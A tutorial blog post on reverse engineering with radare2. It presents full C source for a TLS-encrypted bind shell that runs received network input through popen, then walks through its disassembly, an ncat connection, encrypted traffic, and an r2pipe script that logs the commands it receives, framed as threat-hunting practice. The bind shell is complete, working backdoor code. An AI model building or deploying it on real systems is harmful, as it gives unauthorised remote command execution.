---
layout: post
title:  Reverse engineering x64 binaries with Radare2 - 19 (unix encrypted bind shells over TLS)
tags: reversing c radare
image: '/images//radare2/radare2_19.png'
date: 2020-06-14 15:01:35 -0700
---

You see, it's been a while and together we've learned a lot of things about the C language and it's adventures inside the CPU :)

Now we are starting to become able to build and analyze very cool stuff, freely with open source tools like radare2. 

Today we are going to go over a more advanced network program. We'll see that stuff like radare2 comes very handy when program's communications are encrypted, as then the only way to analyze what is happening inside the program is to open it, debug it (automatically) and keep track of everything.

We'll be working with your classic unix reverse shell and all the way up from there;
#### The bind reverse shell 
Here you have the code! 
```C
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

int create_socket(int port)
{
    int s;
    struct sockaddr_in addr;
    // the sockaddr structure
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    // socket for streaming
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) {
	    perror("Unable to create socket");
	    exit(EXIT_FAILURE);
    }
    // binding the socket to the address
    if (bind(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
	    perror("Unable to bind");
	    exit(EXIT_FAILURE);
    }
    // we listen and accept 1 client max
    if (listen(s, 1) < 0) {
	    perror("Unable to listen");
	    exit(EXIT_FAILURE);
    }

    return s;
}
// init the context for using SSL along with the socket
void init_openssl()
{ 
    SSL_load_error_strings();	
    OpenSSL_add_ssl_algorithms();
}
// cleanup stuff
void cleanup_openssl()
{
    EVP_cleanup();
}
// ctx will be used for secure socket interaction
// learn about everything related -> https://www.openssl.org/docs/man1.0.2/man3/SSL_use_certificate_ASN1.html
SSL_CTX *create_context()
{
    const SSL_METHOD *method;
    SSL_CTX *ctx;

    method = SSLv23_server_method();
    /*creates a new SSL_CTX object as a framework to establish TLS/SSL or DTLS enabled connections using the library context libctx */
    ctx = SSL_CTX_new(method);
    if (!ctx) {
	    perror("Unable to create SSL context");
	    ERR_print_errors_fp(stderr);
	    exit(EXIT_FAILURE);
    }

    return ctx;
}

void configure_context(SSL_CTX *ctx)
{
    // set up the certificate for tls to be used in the server

    // eliptic curve crypto stuff 
    SSL_CTX_set_ecdh_auto(ctx, 1);

    /* Set the key and cert */
    if (SSL_CTX_use_certificate_file(ctx, "cert.pem", SSL_FILETYPE_PEM) <= 0) {
        ERR_print_errors_fp(stderr);
	    exit(EXIT_FAILURE);
    }

    if (SSL_CTX_use_PrivateKey_file(ctx, "key.pem", SSL_FILETYPE_PEM) <= 0 ) {
        ERR_print_errors_fp(stderr);
	    exit(EXIT_FAILURE);
    }
}

int main(int argc, char **argv)
{
    int sock;
    SSL_CTX *ctx;
    char bufbuf[100];
    char cmdbuf[100];
    char command[100];
    int bytes_read;
	FILE *fp;
	
    //get the environment ready
    init_openssl();
    ctx = create_context();
    configure_context(ctx);
    // create a basic socket
    sock = create_socket(4443);

    /* Handle connections, all the time */
    while(1) {
        struct sockaddr_in addr;
        uint len = sizeof(addr);
        SSL *ssl;
        const char reply[] = "test\n";
        // acept the connection from the client, a socket for the client will be created
        int client = accept(sock, (struct sockaddr*)&addr, &len);
        if (client < 0) {
            perror("Unable to accept");
            exit(EXIT_FAILURE);
        }
        // get the SSL reference for the client socket  
        ssl = SSL_new(ctx);
		SSL_set_fd(ssl, client);

        // accept the ssl connection 
        if (SSL_accept(ssl) <= 0) {
            ERR_print_errors_fp(stderr);
        }
        else {	
            // after accepting it, we can start reading/writting
			SSL_write(ssl, "hello hacker \n", 15);
			
			do{
                // zero the buffers
				memset(bufbuf,0,100);
				memset(cmdbuf,0,100);
				memset(command,0,100);
				
				bytes_read = SSL_read(ssl, &bufbuf, 100);
                // if the client closes the socket we are not reading anything
				if(bytes_read > 0){
					//instead bufbuf[strlen(bufbuf)-2] = '\0' 
					strncpy(command,bufbuf,bytes_read-2);

					fp = popen(command, "r");
					while (fgets(cmdbuf, sizeof(cmdbuf), fp) != NULL){
						SSL_write(ssl, cmdbuf, strlen(cmdbuf));
					}

					pclose(fp);
				}

			}while(bufbuf[0] !='\0');
            //if buffer is empty (so nothing has entered from the network) we go on 
        }
        // we get rid of the (client) socket
        SSL_shutdown(ssl);
        SSL_free(ssl);
        close(client);
    }
    //and finally get rid of the rest
    close(sock);
    SSL_CTX_free(ctx);
    cleanup_openssl();
}
```
The disasm, as usual:
```
[0x561f897ed49e]> pdf
            ;-- main:
/ (fcn) sym.main 564
|   sym.main (int argc, char **argv, char **envp);
|           ; var int local_1a0h @ rbp-0x1a0
|           ; var int local_194h @ rbp-0x194
|           ; var int local_18ah @ rbp-0x18a
|           ; var int local_186h @ rbp-0x186
|           ; var int local_184h @ rbp-0x184
|           ; var int local_180h @ rbp-0x180
|           ; var int local_170h @ rbp-0x170
|           ; var int local_100h @ rbp-0x100
|           ; var int local_90h @ rbp-0x90
|           ; var int local_28h @ rbp-0x28
|           ; var int local_1ch @ rbp-0x1c
|           ; var int local_18h @ rbp-0x18
|           ; var int local_10h @ rbp-0x10
|           ; var int local_ch @ rbp-0xc
|           ; var int local_8h @ rbp-0x8
|           ; arg int argc @ rdi
|           ; arg char **argv @ rsi
|           ; DATA XREF from entry0 (0x561f897ed21d)
|           0x561f897ed49e      55             push rbp
|           0x561f897ed49f      4889e5         mov rbp, rsp
|           0x561f897ed4a2      4881eca00100.  sub rsp, 0x1a0
|           0x561f897ed4a9      89bd6cfeffff   mov dword [local_194h], edi ; argc
|           0x561f897ed4af      4889b560feff.  mov qword [local_1a0h], rsi ; argv
|           0x561f897ed4b6      b800000000     mov eax, 0
|           0x561f897ed4bb      e8e5feffff     call sym.init_openssl
|           0x561f897ed4c0      b800000000     mov eax, 0
|           0x561f897ed4c5      e808ffffff     call sym.create_context
|           0x561f897ed4ca      488945f8       mov qword [local_8h], rax
|           0x561f897ed4ce      488b45f8       mov rax, qword [local_8h]
|           0x561f897ed4d2      4889c7         mov rdi, rax
|           0x561f897ed4d5      e84bffffff     call sym.configure_context
|           0x561f897ed4da      bf5b110000     mov edi, 0x115b
|           0x561f897ed4df      e801feffff     call sym.create_socket
|           0x561f897ed4e4      8945f4         mov dword [local_ch], eax
|           ; CODE XREF from sym.main (0x561f897ed6cd)
|       .-> 0x561f897ed4e7      c7857cfeffff.  mov dword [local_184h], 0x10 ; 16
|       :   0x561f897ed4f1      c78576feffff.  mov dword [local_18ah], 0x74736574 ; 'test'
|       :   0x561f897ed4fb      66c7857afeff.  mov word [local_186h], 0xa
|       :   0x561f897ed504      488d957cfeff.  lea rdx, qword [local_184h]
|       :   0x561f897ed50b      488d8d80feff.  lea rcx, qword [local_180h]
|       :   0x561f897ed512      8b45f4         mov eax, dword [local_ch]
|       :   0x561f897ed515      4889ce         mov rsi, rcx
|       :   0x561f897ed518      89c7           mov edi, eax
|       :   0x561f897ed51a      e8a1fcffff     call sym.imp.accept
|       :   0x561f897ed51f      8945f0         mov dword [local_10h], eax
|       :   0x561f897ed522      837df000       cmp dword [local_10h], 0
|      ,==< 0x561f897ed526      7916           jns 0x561f897ed53e
|      |:   0x561f897ed528      488d3d3b0b00.  lea rdi, qword [0x561f897ee06a] ; "Unable to accept"
|      |:   0x561f897ed52f      e87cfcffff     call sym.imp.perror     ; void perror(const char *s)
|      |:   0x561f897ed534      bf01000000     mov edi, 1
|      |:   0x561f897ed539      e822fbffff     call sym.imp.exit       ; void exit(int status)
|      `--> 0x561f897ed53e      488b45f8       mov rax, qword [local_8h]
|       :   0x561f897ed542      4889c7         mov rdi, rax
|       :   0x561f897ed545      e866fbffff     call sym.imp.SSL_new
|       :   0x561f897ed54a      488945e8       mov qword [local_18h], rax
|       :   0x561f897ed54e      8b55f0         mov edx, dword [local_10h]
|       :   0x561f897ed551      488b45e8       mov rax, qword [local_18h]
|       :   0x561f897ed555      89d6           mov esi, edx
|       :   0x561f897ed557      4889c7         mov rdi, rax
|       :   0x561f897ed55a      e831fbffff     call sym.imp.SSL_set_fd
|       :   0x561f897ed55f      488b45e8       mov rax, qword [local_18h]
|       :   0x561f897ed563      4889c7         mov rdi, rax
|       :   0x561f897ed566      e875fcffff     call sym.imp.SSL_accept
|       :   0x561f897ed56b      85c0           test eax, eax
|      ,==< 0x561f897ed56d      7f14           jg 0x561f897ed583
|      |:   0x561f897ed56f      488b05aa2b00.  mov rax, qword [reloc.__frame_dummy_init_array_entry_32] ; [0x561f897f0120:8]=0
|      |:   0x561f897ed576      4889c7         mov rdi, rax
|      |:   0x561f897ed579      e802fcffff     call sym.imp.ERR_print_errors_fp
|     ,===< 0x561f897ed57e      e928010000     jmp 0x561f897ed6ab
|     |`--> 0x561f897ed583      488b45e8       mov rax, qword [local_18h]
|     | :   0x561f897ed587      ba0f000000     mov edx, 0xf            ; 15
|     | :   0x561f897ed58c      488d35e80a00.  lea rsi, qword [0x561f897ee07b] ; "hello hacker \n"
|     | :   0x561f897ed593      4889c7         mov rdi, rax
|     | :   0x561f897ed596      e8d5faffff     call sym.imp.SSL_write
|     |.--> 0x561f897ed59b      488d8570ffff.  lea rax, qword [local_90h]
|     |::   0x561f897ed5a2      ba64000000     mov edx, 0x64           ; 'd' ; 100
|     |::   0x561f897ed5a7      be00000000     mov esi, 0
|     |::   0x561f897ed5ac      4889c7         mov rdi, rax
|     |::   0x561f897ed5af      e87cfaffff     call sym.imp.memset     ; void *memset(void *s, int c, size_t n)
|     |::   0x561f897ed5b4      488d8500ffff.  lea rax, qword [local_100h]
|     |::   0x561f897ed5bb      ba64000000     mov edx, 0x64           ; 'd' ; 100
|     |::   0x561f897ed5c0      be00000000     mov esi, 0
|     |::   0x561f897ed5c5      4889c7         mov rdi, rax
|     |::   0x561f897ed5c8      e863faffff     call sym.imp.memset     ; void *memset(void *s, int c, size_t n)
|     |::   0x561f897ed5cd      488d8590feff.  lea rax, qword [local_170h]
|     |::   0x561f897ed5d4      ba64000000     mov edx, 0x64           ; 'd' ; 100
|     |::   0x561f897ed5d9      be00000000     mov esi, 0
|     |::   0x561f897ed5de      4889c7         mov rdi, rax
|     |::   0x561f897ed5e1      e84afaffff     call sym.imp.memset     ; void *memset(void *s, int c, size_t n)
|     |::   0x561f897ed5e6      488d8d70ffff.  lea rcx, qword [local_90h]
|     |::   0x561f897ed5ed      488b45e8       mov rax, qword [local_18h]
|     |::   0x561f897ed5f1      ba64000000     mov edx, 0x64           ; 'd' ; 100
|     |::   0x561f897ed5f6      4889ce         mov rsi, rcx
|     |::   0x561f897ed5f9      4889c7         mov rdi, rax
|     |::   0x561f897ed5fc      e8dffaffff     call sym.imp.SSL_read
|     |::   0x561f897ed601      8945e4         mov dword [local_1ch], eax
|     |::   0x561f897ed604      837de400       cmp dword [local_1ch], 0
|    ,====< 0x561f897ed608      0f8e8e000000   jle 0x561f897ed69c
|    ||::   0x561f897ed60e      8b45e4         mov eax, dword [local_1ch]
|    ||::   0x561f897ed611      83e802         sub eax, 2
|    ||::   0x561f897ed614      4863d0         movsxd rdx, eax
|    ||::   0x561f897ed617      488d8d70ffff.  lea rcx, qword [local_90h]
|    ||::   0x561f897ed61e      488d8590feff.  lea rax, qword [local_170h]
|    ||::   0x561f897ed625      4889ce         mov rsi, rcx
|    ||::   0x561f897ed628      4889c7         mov rdi, rax
|    ||::   0x561f897ed62b      e830fbffff     call sym.imp.strncpy    ; char *strncpy(char *dest, const char *src, size_t  n)
|    ||::   0x561f897ed630      488d8590feff.  lea rax, qword [local_170h]
|    ||::   0x561f897ed637      488d354c0a00.  lea rsi, qword [0x561f897ee08a] ; "r"
|    ||::   0x561f897ed63e      4889c7         mov rdi, rax
|    ||::   0x561f897ed641      e88afbffff     call sym.imp.popen
|    ||::   0x561f897ed646      488945d8       mov qword [local_28h], rax
|   ,=====< 0x561f897ed64a      eb27           jmp 0x561f897ed673
|  .------> 0x561f897ed64c      488d8500ffff.  lea rax, qword [local_100h]
|  :|||::   0x561f897ed653      4889c7         mov rdi, rax
|  :|||::   0x561f897ed656      e865faffff     call sym.imp.strlen     ; size_t strlen(const char *s)
|  :|||::   0x561f897ed65b      89c2           mov edx, eax
|  :|||::   0x561f897ed65d      488d8d00ffff.  lea rcx, qword [local_100h]
|  :|||::   0x561f897ed664      488b45e8       mov rax, qword [local_18h]
|  :|||::   0x561f897ed668      4889ce         mov rsi, rcx
|  :|||::   0x561f897ed66b      4889c7         mov rdi, rax
|  :|||::   0x561f897ed66e      e8fdf9ffff     call sym.imp.SSL_write
|  :|||::   ; CODE XREF from sym.main (0x561f897ed64a)
|  :`-----> 0x561f897ed673      488b55d8       mov rdx, qword [local_28h]
|  : ||::   0x561f897ed677      488d8500ffff.  lea rax, qword [local_100h]
|  : ||::   0x561f897ed67e      be64000000     mov esi, 0x64           ; 'd' ; 100
|  : ||::   0x561f897ed683      4889c7         mov rdi, rax
|  : ||::   0x561f897ed686      e815faffff     call sym.imp.fgets      ; char *fgets(char *s, int size, FILE *stream)
|  : ||::   0x561f897ed68b      4885c0         test rax, rax
|  `======< 0x561f897ed68e      75bc           jne 0x561f897ed64c
|    ||::   0x561f897ed690      488b45d8       mov rax, qword [local_28h]
|    ||::   0x561f897ed694      4889c7         mov rdi, rax
|    ||::   0x561f897ed697      e834faffff     call sym.imp.pclose
|    `----> 0x561f897ed69c      0fb68570ffff.  movzx eax, byte [local_90h]
|     |::   0x561f897ed6a3      84c0           test al, al
|     |`==< 0x561f897ed6a5      0f85f0feffff   jne 0x561f897ed59b
|     | :   ; CODE XREF from sym.main (0x561f897ed57e)
|     `---> 0x561f897ed6ab      488b45e8       mov rax, qword [local_18h]
|       :   0x561f897ed6af      4889c7         mov rdi, rax
|       :   0x561f897ed6b2      e899faffff     call sym.imp.SSL_shutdown
|       :   0x561f897ed6b7      488b45e8       mov rax, qword [local_18h]
|       :   0x561f897ed6bb      4889c7         mov rdi, rax
|       :   0x561f897ed6be      e86dfaffff     call sym.imp.SSL_free
|       :   0x561f897ed6c3      8b45f0         mov eax, dword [local_10h]
|       :   0x561f897ed6c6      89c7           mov edi, eax
|       :   0x561f897ed6c8      e873f9ffff     call sym.imp.close      ; int close(int fildes)
\       `=< 0x561f897ed6cd      e915feffff     jmp 0x561f897ed4e7
[0x561f897ed49e]> 
```
We can start breaking it down here:

```
|           0x561f897ed4ce      488b45f8       mov rax, qword [local_8h]
|           0x561f897ed4d2      4889c7         mov rdi, rax
|           0x561f897ed4d5      e84bffffff     call sym.configure_context
|           0x561f897ed4da      bf5b110000     mov edi, 0x115b
|           0x561f897ed4df      e801feffff     call sym.create_socket
```
And 0x115b = 4443, so we know the port

The main block comes here:

```
|      |:   0x561f897ed579      e802fcffff     call sym.imp.ERR_print_errors_fp
|     ,===< 0x561f897ed57e      e928010000     jmp 0x561f897ed6ab
|     |`--> 0x561f897ed583      488b45e8       mov rax, qword [local_18h]
|     | :   0x561f897ed587      ba0f000000     mov edx, 0xf            ; 15
|     | :   0x561f897ed58c      488d35e80a00.  lea rsi, qword [0x561f897ee07b] ; "hello hacker \n"
|     | :   0x561f897ed593      4889c7         mov rdi, rax
|     | :   0x561f897ed596      e8d5faffff     call sym.imp.SSL_write
|     |.--> 0x561f897ed59b      488d8570ffff.  lea rax, qword [local_90h]
|     |::   0x561f897ed5a2      ba64000000     mov edx, 0x64           ; 'd' ; 100
|     |::   0x561f897ed5a7      be00000000     mov esi, 0
|     |::   0x561f897ed5ac      4889c7         mov rdi, rax
|     |::   0x561f897ed5af      e87cfaffff     call sym.imp.memset     ; void *memset(void *s, int c, size_t n)
|     |::   0x561f897ed5b4      488d8500ffff.  lea rax, qword [local_100h]
|     |::   0x561f897ed5bb      ba64000000     mov edx, 0x64           ; 'd' ; 100
|     |::   0x561f897ed5c0      be00000000     mov esi, 0
|     |::   0x561f897ed5c5      4889c7         mov rdi, rax
|     |::   0x561f897ed5c8      e863faffff     call sym.imp.memset     ; void *memset(void *s, int c, size_t n)
|     |::   0x561f897ed5cd      488d8590feff.  lea rax, qword [local_170h]
|     |::   0x561f897ed5d4      ba64000000     mov edx, 0x64           ; 'd' ; 100
|     |::   0x561f897ed5d9      be00000000     mov esi, 0
|     |::   0x561f897ed5de      4889c7         mov rdi, rax
|     |::   0x561f897ed5e1      e84afaffff     call sym.imp.memset     ; void *memset(void *s, int c, size_t n)
|     |::   0x561f897ed5e6      488d8d70ffff.  lea rcx, qword [local_90h]
|     |::   0x561f897ed5ed      488b45e8       mov rax, qword [local_18h]
|     |::   0x561f897ed5f1      ba64000000     mov edx, 0x64           ; 'd' ; 100
|     |::   0x561f897ed5f6      4889ce         mov rsi, rcx
|     |::   0x561f897ed5f9      4889c7         mov rdi, rax
|     |::   0x561f897ed5fc      e8dffaffff     call sym.imp.SSL_read
|     |::   0x561f897ed601      8945e4         mov dword [local_1ch], eax
|     |::   0x561f897ed604      837de400       cmp dword [local_1ch], 0
|    ,====< 0x561f897ed608      0f8e8e000000   jle 0x561f897ed69c
|    ||::   0x561f897ed60e      8b45e4         mov eax, dword [local_1ch]
|    ||::   0x561f897ed611      83e802         sub eax, 2
|    ||::   0x561f897ed614      4863d0         movsxd rdx, eax
|    ||::   0x561f897ed617      488d8d70ffff.  lea rcx, qword [local_90h]
|    ||::   0x561f897ed61e      488d8590feff.  lea rax, qword [local_170h]
|    ||::   0x561f897ed625      4889ce         mov rsi, rcx
|    ||::   0x561f897ed628      4889c7         mov rdi, rax
|    ||::   0x561f897ed62b      e830fbffff     call sym.imp.strncpy    ; char *strncpy(char *dest, const char *src, size_t  n)
|    ||::   0x561f897ed630      488d8590feff.  lea rax, qword [local_170h]
|    ||::   0x561f897ed637      488d354c0a00.  lea rsi, qword [0x561f897ee08a] ; "r"
|    ||::   0x561f897ed63e      4889c7         mov rdi, rax
|    ||::   0x561f897ed641      e88afbffff     call sym.imp.popen
|    ||::   0x561f897ed646      488945d8       mov qword [local_28h], rax
|   ,=====< 0x561f897ed64a      eb27           jmp 0x561f897ed673
|  .------> 0x561f897ed64c      488d8500ffff.  lea rax, qword [local_100h]
|  :|||::   0x561f897ed653      4889c7         mov rdi, rax
|  :|||::   0x561f897ed656      e865faffff     call sym.imp.strlen     ; size_t strlen(const char *s)
|  :|||::   0x561f897ed65b      89c2           mov edx, eax
|  :|||::   0x561f897ed65d      488d8d00ffff.  lea rcx, qword [local_100h]
|  :|||::   0x561f897ed664      488b45e8       mov rax, qword [local_18h]
|  :|||::   0x561f897ed668      4889ce         mov rsi, rcx
|  :|||::   0x561f897ed66b      4889c7         mov rdi, rax
|  :|||::   0x561f897ed66e      e8fdf9ffff     call sym.imp.SSL_write
|  :|||::   ; CODE XREF from sym.main (0x561f897ed64a)
|  :`-----> 0x561f897ed673      488b55d8       mov rdx, qword [local_28h]
|  : ||::   0x561f897ed677      488d8500ffff.  lea rax, qword [local_100h]
|  : ||::   0x561f897ed67e      be64000000     mov esi, 0x64           ; 'd' ; 100
|  : ||::   0x561f897ed683      4889c7         mov rdi, rax
|  : ||::   0x561f897ed686      e815faffff     call sym.imp.fgets      ; char *fgets(char *s, int size, FILE *stream)
|  : ||::   0x561f897ed68b      4885c0         test rax, rax
|  `======< 0x561f897ed68e      75bc           jne 0x561f897ed64c
|    ||::   0x561f897ed690      488b45d8       mov rax, qword [local_28h]
|    ||::   0x561f897ed694      4889c7         mov rdi, rax
|    ||::   0x561f897ed697      e834faffff     call sym.imp.pclose
|    `----> 0x561f897ed69c      0fb68570ffff.  movzx eax, byte [local_90h]
|     |::   0x561f897ed6a3      84c0           test al, al
|     |`==< 0x561f897ed6a5      0f85f0feffff   jne 0x561f897ed59b
|     | :   ; CODE XREF from sym.main (0x561f897ed57e)
|     `---> 0x561f897ed6ab      488b45e8       mov rax, qword [local_18h]
```

Some hints about it here:
```
|     |.--> 0x561f897ed59b      488d8570ffff.  lea rax, qword [local_90h]
|     |::   0x561f897ed5a2      ba64000000     mov edx, 0x64           ; 'd' ; 100
|     |::   0x561f897ed5a7      be00000000     mov esi, 0
|     |::   0x561f897ed5ac      4889c7         mov rdi, rax
|     |::   0x561f897ed5af      e87cfaffff     call sym.imp.memset     ; void *memset(void *s, int c, size_t n)
|     |::   0x561f897ed5b4      488d8500ffff.  lea rax, qword [local_100h]
|     |::   0x561f897ed5bb      ba64000000     mov edx, 0x64           ; 'd' ; 100
|     |::   0x561f897ed5c0      be00000000     mov esi, 0
|     |::   0x561f897ed5c5      4889c7         mov rdi, rax
|     |::   0x561f897ed5c8      e863faffff     call sym.imp.memset     ; void *memset(void *s, int c, size_t n)
|     |::   0x561f897ed5cd      488d8590feff.  lea rax, qword [local_170h]
|     |::   0x561f897ed5d4      ba64000000     mov edx, 0x64           ; 'd' ; 100
|     |::   0x561f897ed5d9      be00000000     mov esi, 0
|     |::   0x561f897ed5de      4889c7         mov rdi, rax
|     |::   0x561f897ed5e1      e84afaffff     call sym.imp.memset     ; void *memset(void *s, int c, size_t n)
```
So, three memory addresses get zeroed here, it may mean that they are fundamental in this block of code. And as we are dealing with sockets here, probably those buffers are for recv-transform-send or something like that.

Next thing, a fundamental call, the recv
```
|     |::   0x561f897ed5e6      488d8d70ffff.  lea rcx, qword [local_90h]
|     |::   0x561f897ed5ed      488b45e8       mov rax, qword [local_18h]
|     |::   0x561f897ed5f1      ba64000000     mov edx, 0x64           ; 'd' ; 100
|     |::   0x561f897ed5f6      4889ce         mov rsi, rcx
|     |::   0x561f897ed5f9      4889c7         mov rdi, rax
|     |::   0x561f897ed5fc      e8dffaffff     call sym.imp.SSL_read
|     |::   0x561f897ed601      8945e4         mov dword [local_1ch], eax
|     |::   0x561f897ed604      837de400       cmp dword [local_1ch], 0
|    ,====< 0x561f897ed608      0f8e8e000000   jle 0x561f897ed69c
```
Basically, this call is used here for receiving the "command" from the "client" (hacker):

You can easily emulate that with NCAT as you see here:
````
root@kali:~# ncat -C --ssl 127.0.0.1 4443
hello hacker 
ls
```
The thing here when it comes to analysis is the following: If we are the analyst and we are up to hunt some threats, we are won't be interested that much in the code itself, we would like to see what does the hacker send/receive, so we can know about his / her intentions, see if we are part of a bigger attack campaign, maybe disrupt his operations and so on.

Imagine that we managed to capture an agent that infects machines to get them in a botnet, we would love to keep track of all the commands being sent to it to keep track of the botnet's targets over time and perform greater studies.

On wireshark, the traffic would look like this, as you see, we don't see the command (but we see one small chunk being sent and one big chunk being received!!! useful)
```
00000000  17 03 03 00 15 d4 94 fd  6e 1f 6d 22 fa de 4a 66   ........ n.m"..Jf
00000010  df 1d 68 98 4a 1e 62 68  93 bf                     ..h.J.bh ..
    00000000  17 03 03 00 14 b5 cd 2c  35 93 2f f5 00 37 57 ca   ......., 5./..7W.
    00000010  51 62 6b 96 e2 8e be 2e  eb                        Qbk..... .
    00000019  17 03 03 00 17 3e 25 04  72 62 d4 8f b3 43 d5 ec   .....>%. rb...C..
    00000029  5f c7 3c 3c 2f f5 37 55  fe d0 6b 4f               _.<</.7U ..kO
    00000035  17 03 03 00 28 e2 28 a3  8c 88 41 87 68 af 61 63   ....(.(. ..A.h.ac
    00000045  40 02 13 57 04 0b 11 15  ca e6 64 59 24 94 b5 d1   @..W.... ..dY$...
    00000055  6c e6 86 fa 5f d8 fb e1  ce 06 4f 26 f1            l..._... ..O&.
    00000062  17 03 03 00 1a 0f 80 83  97 b4 50 84 b1 40 66 54   ........ ..P..@fT
    00000072  00 08 3d 74 21 12 0d db  d8 02 35 34 0d eb 65      ..=t!... ..54..e
    00000081  17 03 03 00 15 5f 41 a7  0b fd 48 63 75 d7 c2 49   ....._A. ..Hcu..I
    00000091  83 a6 2b c3 87 e7 42 c8  e0 cf                     ..+...B. ..
    0000009B  17 03 03 00 17 ca ee e7  e4 59 38 82 0f 7e 09 b5   ........ .Y8..~..
    000000AB  59 88 96 10 74 e8 d3 d7  5a 77 fe fe               Y...t... Zw..
    000000B7  17 03 03 00 1c b8 85 fe  80 21 16 f6 2c ed 98 4f   ........ .!..,..O
    000000C7  7e c0 81 07 2d 39 c5 80  14 7c 79 c0 b9 7a c2 40   ~...-9.. .|y..z.@
    000000D7  20                                                  
    000000D8  17 03 03 00 19 c5 0d a7  3c 33 3d 78 cd d6 eb 08   ........ <3=x....
    000000E8  50 e5 02 3f 89 4e 91 be  2c e7 9b 29 17 57         P..?.N.. ,..).W
    000000F6  17 03 03 00 1b e0 73 04  44 b5 de 92 e0 58 74 a2   ......s. D....Xt.
    00000106  a8 92 2a 34 72 3a 4a 10  13 a0 06 a3 37 27 4f 28   ..*4r:J. ....7'O(
    00000116  17 03 03 00 1b e4 6e 5d  cd 50 48 cf ca 7d 28 28   ......n] .PH..}((
    00000126  28 4e 1a ae 1e cb 05 30  7f 5b ff 56 65 ad 8d ce   (N.....0 .[.Ve...
    00000136  17 03 03 00 22 34 5a 82  cb 4e 2f df 8d 79 62 16   ...."4Z. .N/..yb.
    00000146  4a ed 26 9b c2 d4 4c ae  7a ec 04 d5 ee f3 f3 1a   J.&...L. z.......
    00000156  6f d1 b2 52 df f3 80                               o..R...
    0000015D  17 03 03 00 19 c8 4b 55  e0 a4 53 f1 da 82 4e d6   ......KU ..S...N.
    0000016D  6d 54 6d 0c 61 32 b1 3e  34 9e 94 e5 4c 93         mTm.a2.> 4...L.
    0000017B  17 03 03 00 17 f1 c1 fd  bf 7c 58 b8 59 77 0c e8   ........ .|X.Yw..
    0000018B  e1 7a 4d 93 74 72 e5 38  3f 14 63 11               .zM.tr.8 ?.c.
    00000197  17 03 03 00 1f 20 a3 2d  bc b2 fa a0 da d1 a3 37   ..... .- .......7
    000001A7  34 a9 61 fd f5 76 19 cb  26 65 f8 d5 04 a2 07 d1   4.a..v.. &e......
    000001B7  c8 77 12 26                                        .w.&
    000001BB  17 03 03 00 1a f9 a3 6b  e3 88 8a 2c 6d 3e ce c3   .......k ...,m>..
    000001CB  4a be 38 ce d3 6d 26 68  9b 8e e8 36 89 8e 56      J.8..m&h ...6..V
    000001DA  17 03 03 00 18 40 4b df  bc 30 39 74 52 ba f3 5c   .....@K. .09tR..\
    000001EA  d5 70 40 d8 8f ad 74 f2  8d 01 0c 73 c7            .p@...t. ...s.
    000001F7  17 03 03 00 19 b4 da d5  8f 10 30 d3 b2 10 0f 92   ........ ..0.....
    00000207  1f 9c 27 89 54 6c 7a 8b  77 47 f3 db 69 3c         ..'.Tlz. wG..i<
    00000215  17 03 03 00 1b 96 65 d5  ea 7d 5d f9 63 d7 b0 0d   ......e. .}].c...
    00000225  50 21 3c 41 62 6b c5 c2  56 c4 cb 39 37 3b af 15   P!<Abk.. V..97;..
    00000235  17 03 03 00 1b 67 2d 7f  40 6d 94 31 96 a0 c0 0c   .....g-. @m.1....
    00000245  df 55 df 9d 5e 82 28 49  e0 24 30 da 51 12 1d 51   .U..^.(I .$0.Q..Q
    00000255  17 03 03 00 1a 25 14 d2  c0 a4 b8 c0 b5 fa 5b f0   .....%.. ......[.
    00000265  2a 47 7c db 1f 65 50 b1  5a 1d b9 50 8d 7d c1      *G|..eP. Z..P.}.
    00000274  17 03 03 00 18 17 c1 bf  ff b4 60 90 3d eb eb 29   ........ ..`.=..)
    00000284  55 0d a5 e7 53 a7 e1 0a  2d 12 93 ff be            U...S... -....
```

Noramlly, we would try to do that by analyzing the network traffic that is sent between the victim machine and the C&C's but if the "attacker" is decent enough he or she would have set up a TLS connection for the C&C just as we are seeing here.

On that case we'll first reverse the code and examine where the recv/send are being called (and contain the right information), then we'll identify those memory areas containing stuff like commands received and stuff processed, just like this here:
```
afvd
[...]
ar local_18h = 0x7fff2cbedc68  0x0000561f8b58d4e0   ..X..V..
var local_90h = 0x7fff2cbedbf0  0x000000000a0d736c   ls......
var local_100h = 0x7fff2cbedb80  0x0000000000000000   ........ r15
var local_170h = 0x7fff2cbedb10  0x0000000000000000   ........ r15
var local_1ch = 0x7fff2cbedc64  0x8b58d4e00000561f   .V....X.
var local_28h = 0x7fff2cbedc58  0x0000000000000000   ........ r15
[0x561f897ed601]> pxw @ 0x7fff2cbedbf0
0x7fff2cbedbf0  0x0a0d736c 0x00000000 0x00000000 0x00000000  ls..............
```
And then we can do a couple of things here.

We can either write some emulation script ourselves, maybe with a higher level lang like python, so we can build a fake malware agent and use it just for tracking those commands, we can also patch the agent ourselves so we can dump the right memory on a file or something or we can use r2pipe 

like this: 

```python 
# initial PoC
import r2pipe as r2
import json

r = r2.open('sslserv')
r.cmd('doo; s sym.main')
disasm = json.loads(r.cmd("pdj 300"))

list_base_addr = hex(disasm[89]["offset"])
r.cmd('db '+str(list_base_addr))
print("[+] setting a breakpoint at: "+list_base_addr)
list_base_addr = hex(disasm[101]["offset"])
print("[+] setting a breakpoint at: "+list_base_addr)
r.cmd('db '+str(list_base_addr))

while True:

	c1 = r.cmd('dc')

	initial_regs = json.loads(r.cmd('drj'))
	str_cmd =r.cmd('ps @ '+str(initial_regs['rax']))
	print(str_cmd)
	c2 =""
	
	while c2 != c1:
		c2 = r.cmd('dc')

		initial_regs = json.loads(r.cmd('drj'))
		str_cmd =r.cmd('ps @ '+str(initial_regs['rsi']))
		print(str_cmd)
    
```
And if we run it properly, we should start seeing something like this:
```
hit breakpoint at: 55cd0570a66e
-rw-------  1 root root   49 jun 15 12:06 .Xauthority


hit breakpoint at: 55cd0570a66e
-rw-r--r--  1 root root  13K jun 15 12:06 .xfce4-session.verbose-log


hit breakpoint at: 55cd0570a66e
-rw-r--r--  1 root root  13K jun 13 17:02 .xfce4-session.verbose-log.last


hit breakpoint at: 55cd0570a66e
-rw-------  1 root root 3,4K jun 15 12:06 .xsession-errors


hit breakpoint at: 55cd0570a66e
-rw-------  1 root root 3,2K jun 13 17:02 .xsession-errors.old
```
Voilà!!